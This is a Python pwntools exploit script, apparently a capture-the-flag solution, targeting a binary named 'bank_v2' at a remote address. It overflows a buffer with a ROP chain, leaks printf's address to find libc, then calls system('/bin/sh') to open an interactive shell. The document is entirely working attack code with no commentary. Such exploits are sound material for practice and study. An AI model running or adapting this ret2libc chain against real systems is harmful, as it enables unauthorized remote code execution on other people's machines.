#!/usr/bin/python3.8
from pwn import *

ip = '159.89.1.177' # change this
port = 4002 # change this
fname = './bank_v2'
_libc = './libc.so.6'

LOCAL = False

if LOCAL:
	r = process(fname)
else:
	r = remote(ip, port)

libc = ELF(_libc)
e = ELF(fname)
rop = ROP(e)

rl = lambda : r.recvline()
ru = lambda x : r.recvuntil(x)
sla = lambda x,y : r.sendlineafter(x,y)
inter = lambda : r.interactive()

def leak(junk):
	payload = junk
	payload += p64(rop.find_gadget(['pop rdi'])[0])
	payload += p64(e.got['printf'])
	payload += p64(rop.find_gadget(['ret'])[0])
	payload += p64(e.plt['printf'])
	payload += p64(rop.find_gadget(['ret'])[0])
	payload += p64(e.symbols['bank'])
	sla('>', payload)
	leaked = u64(rl()[1:-1].ljust(8, b'\x00'))
	libc.address = leaked - libc.symbols['printf']
	success(f'Leaked printf @ {hex(leaked)}')
	success(f'Libc base     @ {hex(libc.address)}')
	

def shell(junk):
	payload = junk
	payload += p64(rop.find_gadget(['pop rdi'])[0])
	payload += p64(next(libc.search(b'/bin/sh')))
	payload += p64(rop.find_gadget(['ret'])[0])
	payload += p64(libc.symbols['system'])
	sla('>', payload)
	inter()

def pwn():
	junk = b'i'*40
	sla('>', '1')
	leak(junk)
	shell(junk)

if __name__ == '__main__':
	pwn()
